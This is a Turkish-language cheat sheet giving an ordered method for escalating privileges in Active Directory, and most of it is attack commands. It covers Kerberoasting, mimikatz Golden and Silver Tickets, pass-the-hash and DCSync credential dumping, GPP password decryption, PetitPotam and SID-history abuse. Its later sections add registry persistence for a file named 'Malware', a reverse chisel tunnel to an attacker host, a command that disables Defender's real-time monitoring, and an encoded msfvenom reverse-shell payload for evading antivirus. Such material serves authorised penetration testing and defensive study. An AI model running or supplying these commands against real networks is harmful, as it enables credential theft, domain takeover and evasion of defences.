# Active Directory Privilege Escalation Rehberi

Bu rehberde, Active Directory (AD) ortamlarında kullanılan tüm yetki yükseltme (privilege escalation) yöntemleri ve komutları detaylı bir şekilde ele alınmıştır. Yöntemler sıralı olarak açıklanmış ve her bir komutun ne işe yaradığı belirtilmiştir.

## 1. Giriş

Privilege Escalation (Yetki Yükseltme), saldırganların bir Active Directory ortamında daha yüksek seviyede yetkiler elde etmek için kullandığı teknikler bütünüdür. Bu süreçte genellikle misconfigurasyonlar, zafiyetler veya yanlış yapılandırılmış politikalar hedef alınır.

Bu rehberde, hem PowerShell hem de CMD gibi araçlarla kullanılabilecek yöntemler ve komutlar yer almaktadır.

---

## 2. Privilege Escalation Komutları ve Metodolojisi

### 2.1. Local Administrator Yetkilerini Tespit Etme

#### `Find-LocalAdminAccess`
**Amaç:** Hedef kullanıcının local admin yetkisi olduğu makineleri bulur.

```powershell
Find-LocalAdminAccess
```

#### `net localgroup administrators`
**Amaç:** Yerel yönetici grubundaki kullanıcıları listeler.

```cmd
net localgroup administrators
```

#### `Invoke-CheckLocalAdminAccess`
**Amaç:** Kullanıcının mevcut sistemde admin yetkisine sahip olup olmadığını kontrol eder.

```powershell
Invoke-CheckLocalAdminAccess
```

---

### 2.2. Kerberoasting

#### `GetUserSPNs.py`
**Amaç:** SPN (Service Principal Name) ile ilişkili Kerberos ticket bilgilerini toplar.

```bash
python GetUserSPNs.py <domain>/<username>:<password>
```

#### `Invoke-Kerberoast`
**Amaç:** Kerberos ticket'larını dump eder ve brute force saldırıları için hazırlar.

```powershell
Invoke-Kerberoast -OutputFormat Hashcat
```

---

### 2.3. Golden Ticket Saldırısı

#### `mimikatz` (Golden Ticket)
**Amaç:** TGT (Ticket Granting Ticket) oluşturur ve sınırsız yetki elde edilir.

```cmd
privilege::debug
token::elevate
kerberos::golden /domain:<domain> /sid:<domain_sid> /krbtgt:<hash> /user:<username>
```

---

### 2.4. Silver Ticket Saldırısı

#### `mimikatz` (Silver Ticket)
**Amaç:** Belirli bir servise yönelik erişim için ticket oluşturur.

```cmd
kerberos::golden /domain:<domain> /sid:<domain_sid> /target:<target> /rc4:<hash> /user:<username> /service:<service>
```

---

### 2.5. Pass-the-Hash (PtH) Saldırısı

#### `mimikatz` (Pass-the-Hash)
**Amaç:** Hash bilgisi kullanarak kimlik doğrulama gerçekleştirir.

```cmd
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<command>
```

#### `Invoke-TheHash`
**Amaç:** Pass-the-Hash saldırısı gerçekleştirir.

```powershell
Invoke-TheHash -Username <username> -Hash <ntlm_hash> -Command <command>
```

---

### 2.6. DCSync Saldırısı

#### `mimikatz` (DCSync)
**Amaç:** Domain Controller'daki kullanıcı parolalarını ve hash'lerini alır.

```cmd
privilege::debug
lsadump::dcsync /domain:<domain> /user:<username>
```

#### `Invoke-Mimikatz -Command "lsadump::dcsync"`
**Amaç:** DCSync saldırısını PowerShell üzerinden çalıştırır.

```powershell
Invoke-Mimikatz -Command "lsadump::dcsync /domain:<domain> /user:<username>"
```

---

### 2.7. ACL ve DACL Manipülasyonu

#### `Get-ObjectAcl`
**Amaç:** Nesneler üzerindeki erişim kontrol listelerini (ACL) analiz eder.

```powershell
Get-ObjectAcl -SamAccountName <object_name>
```

#### `Set-ObjectAcl`
**Amaç:** Nesneler üzerindeki ACL'leri değiştirir.

```powershell
Set-ObjectAcl -TargetDistinguishedName <dn> -PrincipalSamAccountName <username> -Rights FullControl
```

---

### 2.8. GPP (Group Policy Preferences) Zafiyetleri

#### `gpp-decrypt`
**Amaç:** GPP'de saklanan şifreleri decrypt eder.

```bash
gpp-decrypt <cpassword>
```

#### `Invoke-SearchGPPPassword`
**Amaç:** Group Policy Preferences içinde saklanan şifreleri arar ve decrypt eder.

```powershell
Invoke-SearchGPPPassword
```

---

### 2.9. LAPS (Local Administrator Password Solution) Zafiyetleri

#### `Get-AdmPwdPassword`
**Amaç:** LAPS tarafından yönetilen parolaları alır.

```powershell
Get-AdmPwdPassword -ComputerName <computer>
```

#### `Find-LAPSDelegatedGroups`
**Amaç:** LAPS yönetici gruplarını ve yetkililerini listeler.

```powershell
Find-LAPSDelegatedGroups
```

---

### 2.10. Shadow Credentials

#### `Whisker`
**Amaç:** Shadow Credentials oluşturur ve kullanır.

```bash
Whisker create /target:<target_user> /certificate:<path_to_cert>
```

---

### 2.11. Zafiyetli Servislerin Kullanımı

#### `Unconstrained Delegation`
**Amaç:** Unconstrained Delegation zafiyetini kullanarak yetki yükseltme yapılır.

```powershell
Get-DomainComputer -Unconstrained
```

#### `Constrained Delegation`
**Amaç:** Constrained Delegation yapılandırmalarını analiz eder.

```powershell
Get-DomainUser -TrustedToAuth
```

---

## 3. Yöntemlerin Sıralı Uygulaması

1. **Local Admin yetkilerini kontrol et:**
   - `Find-LocalAdminAccess`
   - `net localgroup administrators`

2. **Kerberos ile yetki yükseltme:**
   - `GetUserSPNs.py`
   - `Invoke-Kerberoast`

3. **Golden ve Silver Ticket saldırıları:**
   - `mimikatz`

4. **Pass-the-Hash saldırısı:**
   - `Invoke-TheHash`

5. **DCSync saldırısı:**
   - `lsadump::dcsync`

6. **GPP zafiyetlerini keşfet:**
   - `gpp-decrypt`
   - `Invoke-SearchGPPPassword`

7. **LAPS zafiyetlerini kullan:**
   - `Get-AdmPwdPassword`

8. **Shadow Credentials saldırılarını dene:**
   - `Whisker`

9. **Delegation zafiyetlerini analiz et:**
   - `Get-DomainComputer -Unconstrained`

---

## 4. Sonuç

Bu rehber, Active Directory ortamlarında yetki yükseltme sürecinde kullanılabilecek yöntemlerin kapsamlı bir listesini sunar. Her adım dikkatli bir şekilde uygulanmalı ve zafiyetler etkin bir şekilde değerlendirilmelidir.

---

## 5. Ekstra Zafiyetler ve Teknikler

### 5.1. Printer Bug (MS-RPRN) Kullanımı
**Amaç:** Yazıcı protokolü zafiyetini kullanarak hedef sistemde yetki yükseltme.

```powershell
Invoke-PrinterBug -Target <target_dc> -Credential <credentials>
```

### 5.2. PetitPotam Saldırısı
**Amaç:** Windows işletim sistemlerindeki MS-EFSRPC zafiyetini kullanarak NTLM relay saldırısı gerçekleştirmek.

```bash
python3 PetitPotam.py -d <domain> -u <user> -p <password> -t <target_dc>
```

### 5.3. Shadow Attack (ADCS)
**Amaç:** Active Directory Certificate Services (ADCS) zafiyetlerini kullanarak saldırı.

```powershell
Get-ADCSCertificateTemplate
Request-Certificate -Template <template_name>
```

### 5.4. SID History Manipülasyonu
**Amaç:** SID history özelliğini kullanarak bir kullanıcıyı domain admin yetkileriyle donatmak.

```powershell
Set-DomainObject -Identity <object> -Property sidHistory -Value <sid>
```

---

## 6. Post-Exploitation Adımları

### 6.1. Sensitive Information Discovery
**Amaç:** Hedef sistemde hassas bilgileri aramak.

#### PowerShell:
```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.txt, *.docx, *.xls | Select-String -Pattern "password"
```

#### Linux:
```bash
grep -ri "password" /etc/
```

### 6.2. Persistence Sağlama
Yetki yükselttikten sonra ortamda kalıcı hale gelmek için:

#### Registry persistensi:
```powershell
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Malware" -Value "C:\payload.exe"
```

### 6.3. Network Pivoting
#### Chisel veya Plink kullanarak pivoting:
```bash
./chisel server -p 1080 --reverse
./chisel client <attacker_ip>:1080 R:1080:127.0.0.1:3389
```

---

## 7. Defensive Evasion Teknikleri

### 7.1. PowerShell Logging'i Bypass Etme
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 7.2. AV/EDR Tespitini Engelleme
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -f exe > payload.exe
```

---

## 8. Uygulamalı Senaryolar

### Örnek Senaryo: Kerberoasting

1. `GetUserSPNs.py` ile SPN'leri listeleyin.
2. `hashcat` kullanarak hashleri kırın:
   ```bash
   hashcat -m 13100 -a 0 <hash_file> <wordlist>
   ```

---

## 9. PowerShell ve Bash Scriptleri

### Local Admin Kontrol Scripti (PowerShell):
```powershell
$computers = Get-Content computers.txt
foreach ($computer in $computers) {
    Invoke-Command -ComputerName $computer -ScriptBlock { net localgroup administrators }
}
```

### Kerberos Ticket Dump Scripti (Bash):
```bash
#!/bin/bash
for user in $(cat users.txt); do
    python GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
done
```

---
